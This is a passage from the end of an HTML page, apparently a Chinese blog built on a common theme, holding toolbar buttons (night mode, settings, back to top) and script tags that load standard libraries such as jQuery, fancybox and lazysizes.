title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><script src="/js/third-party/ClickShowText.js"></script></body></html>
